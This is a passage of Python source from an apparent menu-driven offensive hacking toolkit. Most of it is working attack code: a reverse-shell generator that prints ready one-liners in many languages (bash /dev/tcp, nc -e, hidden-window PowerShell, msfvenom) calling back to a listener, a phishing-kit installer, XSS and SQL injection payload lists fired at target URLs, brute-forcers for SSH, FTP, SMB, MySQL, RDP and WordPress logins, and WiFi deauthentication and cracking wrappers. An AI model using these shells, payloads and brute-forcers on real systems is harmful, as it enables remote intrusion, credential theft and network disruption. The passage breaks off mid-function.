        f"{BLUE}║   {WHITE}[11]{BLUE} Crypto Tools           {WHITE}[26]{BLUE} CVE Scanner        ║",
        f"{BLUE}║   {WHITE}[12]{BLUE} AI Chatbot             {WHITE}[27]{BLUE} Wordlist Generator ║",
        f"{BLUE}║   {WHITE}[13]{BLUE} Social Media Tools     {WHITE}[28]{BLUE} XXE Injection      ║",
        f"{BLUE}║   {WHITE}[14]{BLUE} Web Hacking Suite      {WHITE}[29]{BLUE} SSRF Scanner       ║",
        f"{BLUE}║   {WHITE}[15]{BLUE} Phishing Tools         {WHITE}[30]{BLUE} Packet Sniffer     ║",
        f"{BLUE}║   {WHITE}[31]{BLUE} Image Metadata         {WHITE}[32]{BLUE} TechInt Analyzer   ║",
        f"{BLUE}║   {WHITE}[33]{BLUE} Phone Lookup                                          ║",
        f"{BLUE}║                                  {WHITE}[00]{BLUE} Exit               ║",
        f"{BLUE}╚═══════════════════════════════════════════════════════╝{RESET}"
    ]

    for line in banner_lines:
        print(line)

def main_menu():
    while True:
        show_banner()
        try:
            raw = input(f"{SG}  root@{HOSTNAME}:~$ {SR}").strip()
            choice = raw.zfill(2) if raw.isdigit() else raw

            modules = {
                "00": lambda: sys.exit(0),
                "01": lambda: DDoSFlood().run(),
                "02": lambda: OSINTPro().run(),
                "03": lambda: XSSInjector().run(),
                "04": lambda: SQLInjector().run(),
                "05": lambda: BruteForceEngine().run(),
                "06": lambda: VulnScanner("VulnScanner").run(),
                "07": lambda: NetworkScanner().run(),
                "08": lambda: NetworkScanner().port_scanner(input(f"{SG}[+] Host: {SR}")),
                "09": lambda: NetworkScanner().dns_enum(input(f"{SG}[+] Domain: {SR}")),
                "10": lambda: CryptoModule().run(),
                "11": lambda: CryptoModule().run(),
                "12": lambda: AIChatbot().run(),
                "13": social_media_tools,
                "14": lambda: WebHackingSuite().run(),
                "15": phishing_tools,
                "16": reverse_shell_generator,
                "17": wifi_tools,
                "18": metasploit_helper,
                "19": lambda: SteganoTool().run(),
                "20": lambda: JWTTool().run(),
                "21": lambda: SubdomainTakeover().run(),
                "22": lambda: ShodanSearch().run(),
                "23": lambda: FileAnalyzer().run(),
                "24": lambda: PayloadGenerator().run(),
                "25": lambda: ARPSpoofer().run(),
                "26": lambda: CVEScanner().run(),
                "27": lambda: WordlistGenerator().run(),
                "28": lambda: XXEInjector().run(),
                "29": lambda: SSRFScanner().run(),
                "30": lambda: PacketSniffer().run(),
                "31": lambda: ImageMetadata().run(),
                "32": lambda: TechIntAnalyzer().run(),
                "33": lambda: PhoneLookup().run(),
            }

            if choice in modules:
                modules[choice]()
            elif choice:
                print(f"\n{R}[!] Invalid Option: {raw}{SR}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{R}[!] Interrupted. Exiting...{SR}")
            if input(f"{SG}[+] Exit? (y/N): {SR}").lower() != 'n':
                sys.exit(0)
        except Exception as e:
            print(f"\n{R}[!] Error: {e}{SR}")
            time.sleep(2)

def social_media_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║       SOCIAL MEDIA TOOLS ENGINE          ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Social Media Tools:{SR}")
    print(f"  {SC}[1]{SR} Username Checker")
    print(f"  {SC}[2]{SR} Instagram Analyzer")
    choice = input(f"\n{SG}[+] Choice: {SR}")
    if choice == "1":
        username = input(f"{SG}[+] Username to check: {SR}")
        OSINTPro().username_osint(username)
    elif choice == "2":
        print(f"{SY}[-] Instagram Analyzer coming soon!{SR}")
    pause()

def phishing_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SM}
    ╔═══════════════════════════════════════════╗
    ║         PHISHING TOOLS ENGINE            ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Phishing Framework:{SR}")
    print(f"  {SC}[1]{SR} Zphisher Setup")
    choice = input(f"\n{SG}[+] Choice: {SR}")
    if choice == "1":
        zphisher_dir = os.path.join(TOOLS_DIR, "zphisher")
        if not os.path.exists(zphisher_dir):
            print(f"{SG}[+] Installing Zphisher...{SR}")
            subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher.git", zphisher_dir], timeout=60)
        if os.path.exists(zphisher_dir):
            os.chdir(zphisher_dir)
            subprocess.run(["bash", "zphisher.sh"])
            os.chdir(HOME_DIR)
    pause()

def reverse_shell_generator():
    os.system('cls' if os.name == 'nt' else 'clear')
    boxed("REVERSE SHELL GENERATOR", color=SB)
    print(f"\n{SY}[!] Shell Types:{SR}")
    print(f"  {SC}[ 1]{SR} Python           {SC}[ 8]{SR} Socat")
    print(f"  {SC}[ 2]{SR} Bash             {SC}[ 9]{SR} Node.js")
    print(f"  {SC}[ 3]{SR} Netcat           {SC}[10]{SR} Golang")
    print(f"  {SC}[ 4]{SR} PHP              {SC}[11]{SR} Awk")
    print(f"  {SC}[ 5]{SR} Perl             {SC}[12]{SR} Telnet")
    print(f"  {SC}[ 6]{SR} Ruby             {SC}[13]{SR} War (JSP/WAR)")
    print(f"  {SC}[ 7]{SR} PowerShell       {SC}[14]{SR} MSFvenom one-liners")
    print(f"  {SC}[15]{SR} All shells")
    print(f"  {SC}[16]{SR} Show TTY upgrade tricks")
    choice = input(f"\n{SG}[+] Shell Type (1-16): {SR}")

    if choice == "16":
        print(f"\n{SC}┌─ TTY Upgrade (after catching a shell) ────────────────{SR}")
        print(f"{SC}│{SR} {SG}Step 1 (Python PTY spawn):{SR}")
        print(f"{SC}│{SR}   {W}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'{SR}")
        print(f"{SC}│{SR}")
        print(f"{SC}│{SR} {SG}Step 2 (in shell - set terminal):{SR}")
        print(f"{SC}│{SR}   {W}export TERM=xterm-256color{SR}")
        print(f"{SC}│{SR}")
        print(f"{SC}│{SR} {SG}Step 3 (Ctrl-Z to background, then in YOUR shell):{SR}")
        print(f"{SC}│{SR}   {W}stty raw -echo; fg{SR}")
        print(f"{SC}│{SR}   (press Enter twice, shell is now fully interactive){SR}")
        print(f"{SC}│{SR}")
        print(f"{SC}│{SR} {SG}Alternative - stty rows/cols:{SR}")
        print(f"{SC}│{SR}   {W}stty -a  # on YOUR terminal to get dimensions{SR}")
        print(f"{SC}│{SR}   {W}stty rows 40 cols 150  # inside reverse shell{SR}")
        print(f"{SC}└────────────────────────────────────────────────────────{SR}")
        pause()
        return

    ip = input(f"{SG}[+] Listener IP: {SR}")
    port = input(f"{SG}[+] Listener Port: {SR}")

    shells = {
        "1": ("Python", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\", {port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"),
        "2": ("Bash", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
        "3": ("Netcat (traditional)", f"nc -e /bin/sh {ip} {port}"),
        "4": ("PHP", f"<?php $sock=fsockopen(\"{ip}\", {port});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>"),
        "5": ("Perl", f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        "6": ("Ruby", f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        "7": ("PowerShell", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""),
        "8": ("Socat (full TTY)", f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"),
        "9": ("Node.js", f"node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\")'"),
        "10": ("Golang", f'echo \'package main;import("net";"os/exec");func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/r.go && go run /tmp/r.go'),
        "11": ("Awk", f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"),
        "12": ("Telnet (requires 2 ports)", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {ip} {port} >/tmp/f"),
        "13": ("JSP (Tomcat)", f'<% Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}}); %>'),
        "14": ("MSFvenom (linux)", f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o /tmp/shell.elf"),
    }

    lines = []
    if choice == "15":
        for key in sorted(shells.keys(), key=int):
            lang, code = shells[key]
            lines.append((lang, code))
    elif choice in shells:
        lang, code = shells[choice]
        lines.append((lang, code))

    print()
    for lang, code in lines:
        divider(color=M)
        print(f"  {SM}[+] {lang}{SR}")
        divider(color=M)
        print(f"  {G}{code}{SR}\n")

    print(f"  {SY}Listener (on your box):{SR}")
    print(f"  {G}nc -lvnp {port}{SR}")
    print(f"  {SY}Or with pwncat-cs (auto TTY + handy):{SR}")
    print(f"  {G}pwncat-cs -lp {port}{SR}")
    pause()

def wifi_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SY}
    ╔═══════════════════════════════════════════╗
    ║          WIFI HACKING TOOLS              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] WiFi Tools (Linux Only):{SR}")
    print(f"  {SC}[1]{SR} Airmon-ng (Monitor Mode)")
    print(f"  {SC}[2]{SR} Airodump-ng (Capture Packets)")
    print(f"  {SC}[3]{SR} Aireplay-ng (Deauth Attack)")
    print(f"  {SC}[4]{SR} Aircrack-ng (WPA/WPA2 Crack)")
    print(f"  {SC}[5]{SR} Wifite (Auto WiFi Audit)")
    choice = input(f"\n{SG}[+] Choice: {SR}")

    if choice == "1":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True, text=True)
        print(result.stdout[-500:] if len(result.stdout) > 500 else result.stdout)
    elif choice == "2":
        bssid = input(f"{SG}[+] BSSID (Enter for broadcast scan): {SR}")
        channel = input(f"{SG}[+] Channel (Enter for all): {SR}")
        output = input(f"{SG}[+] Output file prefix: {SR}")
        cmd = ["sudo", "airodump-ng"]
        if bssid: cmd.extend(["--bssid", bssid])
        if channel: cmd.extend(["--channel", channel])
        if output: cmd.extend(["-w", output])
        cmd.append("wlan0mon")
        subprocess.run(cmd)
    elif choice == "3":
        bssid = input(f"{SG}[+] Target BSSID: {SR}")
        client = input(f"{SG}[+] Client MAC (Enter for broadcast): {SR}")
        count = input(f"{SG}[+] Packet count (Enter=100): {SR}") or "100"
        cmd = ["sudo", "aireplay-ng", "--deauth", count, "-a", bssid]
        if client: cmd.extend(["-c", client])
        cmd.append("wlan0mon")
        subprocess.run(cmd)
    elif choice == "4":
        cap_file = input(f"{SG}[+] Capture file (.cap): {SR}")
        wordlist = input(f"{SG}[+] Wordlist (Enter=/usr/share/wordlists/rockyou.txt): {SR}") or "/usr/share/wordlists/rockyou.txt"
        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])
    elif choice == "5":
        subprocess.run(["sudo", "wifite"])
    pause()

def metasploit_helper():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║         METASPLOIT HELPER TOOL           ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Useful Metasploit Commands:{SR}")
    print(f"  {SC}msfconsole - Launch Metasploit{SR}")
    print(f"  {SC}msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [output]{SR}")
    print(f"\n{SY}[!] Common Payloads:{SR}")
    print(f"  {SC}linux/x64/shell_reverse_tcp{SR}")
    print(f"  {SC}windows/x64/meterpreter/reverse_tcp{SR}")
    print(f"  {SC}android/meterpreter/reverse_tcp{SR}")
    print(f"  {SC}php/meterpreter_reverse_tcp{SR}")
    print(f"  {SC}python/meterpreter/reverse_tcp{SR}")
    print(f"\n{SY}[!] Example:{SR}")
    print(f"  {SC}msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf{SR}")
    print(f"\n{SY}[!] Listener Setup:{SR}")
    print(f"  {SC}use exploit/multi/handler{SR}")
    print(f"  {SC}set PAYLOAD linux/x64/shell_reverse_tcp{SR}")
    print(f"  {SC}set LHOST 0.0.0.0{SR}")
    print(f"  {SC}set LPORT 4444{SR}")
    print(f"  {SC}exploit{SR}")
    pause()

class XSSInjector:
    def __init__(self):
        self.name = "XSS INJECTION ENGINE"
        self.payloads = [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\" onmouseover=alert(1) \"",
            "' onclick=alert(1) '",
            "';alert(1);//",
        ]

    def test_reflected(self, url, param):
        print(f"\n{SC}[*] Testing Reflected XSS on parameter: {param}{SR}")
        results = []
        total = len(self.payloads)

        for i, payload in enumerate(self.payloads):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] if isinstance(v, list) else v for k, v in test_params.items()})).geturl()

            try:
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=3, verify=False)
                if payload in r.text or payload.lower() in r.text:
                    print(f"    {R}[!] XSS DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url})
                    if len(results) >= 5:
                        break
            except:
                pass

            progress_bar(i+1, total, prefix=f"{SC}Testing XSS payloads{SR}")
            time.sleep(0.01)

        print()
        if results:
            print(f"\n{R}[!] {len(results)} working XSS payloads found!{SR}")
        else:
            print(f"\n{SY}[-] No XSS detected with current payloads{SR}")
        return results

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        XSS INJECTION ENGINE              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        url = input(f"{SG}[+] Target URL (with parameters): {SR}")
        param = input(f"{SG}[+] Parameter to test: {SR}")
        self.test_reflected(url, param)
        pause()

class SQLInjector:
    def __init__(self):
        self.name = "SQL INJECTION ENGINE"
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "admin' --",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "\" AND 1=1 --",
            "1' ORDER BY 1 --",
            "1' ORDER BY 2 --",
            "' UNION SELECT @@version,2,3 --",
            "' UNION SELECT database(),2,3 --",
            "' UNION SELECT user(),2,3 --",
            "1 AND SLEEP(5) --",
            "' AND SLEEP(5) --",
            "'; WAITFOR DELAY '0:0:5' --",
            "' OR pg_sleep(5) --",
        ]

    def test_injection(self, url, param):
        print(f"\n{SC}[*] Testing SQL Injection on parameter: {param}{SR}")
        results = []
        total = len(self.payloads)

        for i, payload in enumerate(self.payloads):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] if isinstance(v, list) else v for k, v in test_params.items()})).geturl()

            try:
                start_time = time.time()
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=10, verify=False)
                elapsed = time.time() - start_time
                indicators = ["sql", "mysql", "syntax error", "unclosed", "quotation mark", "you have an error",
                              "warning: mysql", "odbc", "driver", "mysql_fetch", "pg_query", "sqlite", "oracle"]
                response_lower = r.text.lower()
                vulnerable = any(indicator in response_lower for indicator in indicators)

                if "sleep" in payload.lower() and elapsed > 4:
                    print(f"    {R}[!] TIME-BASED SQLi DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url, "type": "time-based"})
                elif vulnerable:
                    print(f"    {R}[!] SQLi DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url, "type": "error-based"})

                if len(results) >= 5:
                    break
            except:
                pass

            progress_bar(i+1, total, prefix=f"{SC}Testing SQLi payloads{SR}")
            time.sleep(0.01)

        print()
        if results:
            print(f"\n{R}[!] {len(results)} working SQLi payloads found!{SR}")
        else:
            print(f"\n{SY}[-] No SQLi detected with current payloads{SR}")
        return results

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        SQL INJECTION ENGINE              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        url = input(f"{SG}[+] Target URL (with parameters): {SR}")
        param = input(f"{SG}[+] Parameter to test: {SR}")
        self.test_injection(url, param)
        pause()

class BruteForceEngine:
    def __init__(self):
        self.name = "BRUTE FORCE ENGINE"

    def load_wordlists(self):
        usernames = ["admin", "root", "user", "test", "guest", "info", "adm", "mysql", "postgres", "pi", "ubuntu", "debian", "oracle", "sa", "administrator", "manager", "demo", "support", "webmaster", "backup", "ftp"]
        passwords = ["admin", "root", "123456", "password", "admin123", "root123", "toor", "Password", "password123", "admin1234", "1234", "letmein", "welcome", "monkey", "dragon", "master", "qwerty", "111111", "123123"]
        return usernames, passwords

    def ssh_bruteforce(self, target, port=22, username=None):
        print(f"\n{SC}[*] SSH Brute Force on {target}:{port}{SR}")
        try:
            import paramiko
        except ImportError:
            print(f"    {SY}[!] Installing paramiko...{SR}")
            _pip_install("paramiko")
            import paramiko
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(target, port=port, username=user, password=pwd, timeout=5)
                    print(f"    {SG}[+] SUCCESS: {user}:{pwd}{SR}")
                    client.close()
                    return {"username": user, "password": pwd}
                except paramiko.AuthenticationException:
                    print(f"    {SY}[-] Failed: {user}:{pwd}{SR}")
                except:
                    print(f"    {R}[-] Connection error: {user}:{pwd}{SR}")
        print(f"    {SY}[-] No credentials found{SR}")
        return None

    def ftp_bruteforce(self, target, port=21, username=None):
        import ftplib
        print(f"\n{SC}[*] FTP Brute Force on {target}:{port}{SR}")
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(user, pwd)
                    print(f"    {SG}[+] SUCCESS: {user}:{pwd}{SR}")
                    ftp.quit()
                    return {"username": user, "password": pwd}
                except:
                    print(f"    {SY}[-] Failed: {user}:{pwd}{SR}")
        print(f"    {SY}[-] No credentials found{SR}")
        return None

    def web_auth_bruteforce(self, target, username=None):
        print(f"\n{SC}[*] HTTP Auth Brute Force on {target}{SR}")
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    r = requests.get(target, auth=(user, pwd), timeout=5, verify=False)
                    if r.status_code == 200:
                        status(f"SUCCESS: {user}:{pwd}", "ok")
                        return {"username": user, "password": pwd}
                    else:
                        status(f"Failed: {user}:{pwd}", "warn")
                except:
                    status(f"Connection error: {user}:{pwd}", "err")
        status("No credentials found", "warn")
        return None

    def wordpress_bruteforce(self, url, username):
        print(f"\n{SC}[*] WordPress Brute Force on {url} (user: {username}){SR}")
        login_url = url.rstrip("/") + "/wp-login.php"
        _, passwords = self.load_wordlists()
        for pwd in passwords:
            try:
                r = requests.post(login_url, data={"log": username, "pwd": pwd, "wp-submit": "Log In"},
                                timeout=8, verify=False, allow_redirects=False)
                if r.status_code in (302, 301) and "wp-admin" in r.headers.get("Location", ""):
                    status(f"SUCCESS: {username}:{pwd}", "hit")
                    return {"username": username, "password": pwd}
                status(f"Failed: {username}:{pwd}", "warn")
            except Exception as e:
                status(f"Error: {e}", "err")
                break
        status("No credentials found", "warn")

    def smb_bruteforce(self, target, username=None):
        print(f"\n{SC}[*] SMB Brute Force on {target}{SR}")
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            status("Installing impacket...", "warn")
            _pip_install("impacket")
            from impacket.smbconnection import SMBConnection

        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:15]:
                try:
                    conn = SMBConnection(target, target, timeout=5)
                    conn.login(user, pwd)
                    status(f"SUCCESS: {user}:{pwd}", "hit")
                    conn.close()
                    return {"username": user, "password": pwd}
                except Exception:
                    status(f"Failed: {user}:{pwd}", "warn")
        status("No credentials found", "warn")

    def mysql_bruteforce(self, target, port=3306, username=None):
        print(f"\n{SC}[*] MySQL Brute Force on {target}:{port}{SR}")
        try:
            import pymysql
        except ImportError:
            status("Installing pymysql...", "warn")
            _pip_install("pymysql")
            import pymysql

        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:15]:
                try:
                    conn = pymysql.connect(host=target, port=port, user=user, password=pwd, connect_timeout=4)
                    status(f"SUCCESS: {user}:{pwd}", "hit")
                    conn.close()
                    return {"username": user, "password": pwd}
                except pymysql.err.OperationalError as e:
                    if "Access denied" in str(e):
                        status(f"Failed: {user}:{pwd}", "warn")
                    else:
                        status(f"Connection error: {e}", "err")
                        return None
                except Exception as e:
                    status(f"Error: {e}", "err")
        status("No credentials found", "warn")

    def rdp_bruteforce(self, target, username=None):
        print(f"\n{SC}[*] RDP Brute Force on {target} (requires xfreerdp/rdesktop){SR}")
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        if not shutil.which("xfreerdp"):
            status("xfreerdp not installed. Try: sudo apt install freerdp2-x11", "err")
            return
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    result = subprocess.run(
                        ["xfreerdp", f"/v:{target}", f"/u:{user}", f"/p:{pwd}", "/cert-ignore", "+auth-only"],
                        capture_output=True, timeout=8
                    )
                    if result.returncode == 0:
                        status(f"SUCCESS: {user}:{pwd}", "hit")
                        return {"username": user, "password": pwd}
                    status(f"Failed: {user}:{pwd}", "warn")
                except subprocess.TimeoutExpired:
                    status(f"Timeout: {user}:{pwd}", "warn")
        status("No credentials found", "warn")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("BRUTE FORCE ENGINE", color=SM)
        print(f"\n{SY}[!] Brute Force Modules:{SR}")
        print(f"  {SC}[1]{SR} SSH Brute Force        {SC}[4]{SR} WordPress Login")
        print(f"  {SC}[2]{SR} FTP Brute Force        {SC}[5]{SR} SMB (Windows shares)")
        print(f"  {SC}[3]{SR} HTTP Basic Auth        {SC}[6]{SR} MySQL")
        print(f"  {SC}[7]{SR} RDP (Remote Desktop)")
        choice = input(f"\n{SG}[+] Choice: {SR}")

        if choice in ("1", "2", "3"):
            target = input(f"{SG}[+] Target IP or URL: {SR}")
            port = 22
            if choice in ("1", "2"):
                port = int(input(f"{SG}[+] Port: {SR}") or ("22" if choice == "1" else "21"))
            username = input(f"{SG}[+] Specific Username (Enter for list): {SR}") or None
            if choice == "1":
                self.ssh_bruteforce(target, port, username)
            elif choice == "2":
                self.ftp_bruteforce(target, port, username)
            elif choice == "3":
                self.web_auth_bruteforce(target, username)
        elif choice == "4":
            url = input(f"{SG}[+] WordPress site URL (e.g., https://site.com): {SR}")
            user = input(f"{SG}[+] Target username: {SR}")
            self.wordpress_bruteforce(url, user)
        elif choice == "5":
            target = input(f"{SG}[+] Target IP: {SR}")
            user = input(f"{SG}[+] Username (Enter for list): {SR}") or None
            self.smb_bruteforce(target, user)
        elif choice == "6":
            target = input(f"{SG}[+] Target IP: {SR}")
            port = int(input(f"{SG}[+] Port (Enter=3306): {SR}") or "3306")
            user = input(f"{SG}[+] Username (Enter for list): {SR}") or None
            self.mysql_bruteforce(target, port, user)
        elif choice == "7":
            target = input(f"{SG}[+] Target IP: {SR}")
            user = input(f"{SG}[+] Username (Enter for list): {SR}") or None
            self.rdp_bruteforce(target, user)
        pause()

class VulnScanner:
    def __init__(self, name):
        self.name = name

    def check_headers(self, url):
        print(f"\n{SC}[*] Checking Security Headers on {url}{SR}")
        try:
            r = requests.get(url, headers={"User-Agent": random_ua()}, timeout=5, verify=False)
            headers = r.headers
            missing = []
            for h in ['Content-Security-Policy', 'X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security']:
                if h not in headers:
                    missing.append(h)
            if missing:
                print(f"    {R}[!] Missing security headers: {', '.join(missing)}{SR}")
            else:
                print(f"    {SG}[+] All major security headers present{SR}")
            return missing
        except Exception as e:
            print(f"    {R}[-] Could not retrieve headers ({e}){SR}")
            return []

    def check_ssl(self, url):
        print(f"\n{SC}[*] Checking SSL/TLS on {url}{SR}")
        try:
            parsed = urlparse(url)
            if parsed.scheme != 'https':
                print(f"    {R}[!] No HTTPS detected{SR}")
                return False
            host = parsed.netloc.split(':')[0]
            port = parsed.port if parsed.port else 443
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    print(f"    {SG}[+] SSL/TLS active. Cert issuer: {cert.get('issuer', 'N/A')}{SR}")
                    return True
        except Exception as e:
            print(f"    {R}[!] SSL/TLS issues detected ({e}){SR}")
            return False

    def check_vulnerabilities(self, url):
        print(f"\n{SC}[*] Checking exposed paths on {url}{SR}")
        vulnerable_paths = [
            "/admin", "/login", "/config", "/backup", "/phpinfo.php", "/.env", "/wp-config.php",
            "/.git/config", "/.git/HEAD", "/.svn/entries", "/.DS_Store", "/server-status",
            "/server-info", "/.htaccess", "/.htpasswd", "/web.config", "/config.json",
            "/composer.json", "/package.json", "/.npmrc", "/.docker/config.json",
            "/backup.sql", "/database.sql", "/dump.sql", "/test.php", "/info.php",
        ]
        results = []
        for path in vulnerable_paths:
            test_url = urljoin(url, path)
            try:
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=3, verify=False)
                if r.status_code == 200 and len(r.content) > 10:
                    status(f"Exposed: {test_url}  ({len(r.content)}B)", "hit")
                    results.append(test_url)
            except:
                pass
        if not results:
            status("No exposed endpoints found", "ok")
        return results

    def check_cors(self, url):
        print(f"\n{SC}[*] Checking CORS misconfig on {url}{SR}")
        evil = "https://evil.attacker.com"
        try:
            r = requests.get(url, headers={"Origin": evil, "User-Agent": random_ua()}, timeout=5, verify=False)
            aco = r.headers.get("Access-Control-Allow-Origin", "")
            acc = r.headers.get("Access-Control-Allow-Credentials", "")
            if aco == evil:
                status(f"CORS VULN: reflects arbitrary Origin ({aco})", "hit")
                if acc.lower() == "true":
                    status("WITH credentials=true - full account takeover possible", "hit")
            elif aco == "*":
                status("CORS: wildcard allowed (low severity without credentials)", "warn")
            elif aco == "null":
                status("CORS: 'null' allowed - exploitable via sandboxed iframe", "hit")
            else:
                status(f"CORS: {aco or 'no header'} (looks OK)", "ok")
        except Exception as e:
            status(f"Error: {e}", "err")

    def check_cookies(self, url):
        print(f"\n{SC}[*] Checking cookie security flags on {url}{SR}")
        try:
            r = requests.get(url, headers={"User-Agent": random_ua()}, timeout=5, verify=False)
            if not r.cookies:
                status("No cookies set", "info")
                return
            for c in r.cookies:
                issues = []
                if not c.secure:
                    issues.append("missing Secure")
                if not c.has_nonstandard_attr("HttpOnly") and not c.has_nonstandard_attr("httponly"):
                    issues.append("missing HttpOnly")
                samesite = c.get_nonstandard_attr("SameSite") or c.get_nonstandard_attr("samesite")
                if not samesite:
                    issues.append("missing SameSite")
                if issues:
                    status(f"{c.name}: {', '.join(issues)}", "warn")
                else:
                    status(f"{c.name}: all flags OK", "ok")
        except Exception as e:
            status(f"Error: {e}", "err")

    def check_git_exposure(self, url):
        print(f"\n{SC}[*] Checking for exposed .git directory{SR}")
        try:
            r = requests.get(urljoin(url, "/.git/HEAD"), timeout=5, verify=False)
            if r.status_code == 200 and "ref:" in r.text:
                status(".git/HEAD exposed - full source code leak possible!", "hit")
                status("Tool: git-dumper can extract the entire repo", "info")
                return True
            status(".git not exposed", "ok")
        except Exception as e:
            status(f"Error: {e}", "err")

    def check_methods(self, url):
        print(f"\n{SC}[*] Testing dangerous HTTP methods{SR}")
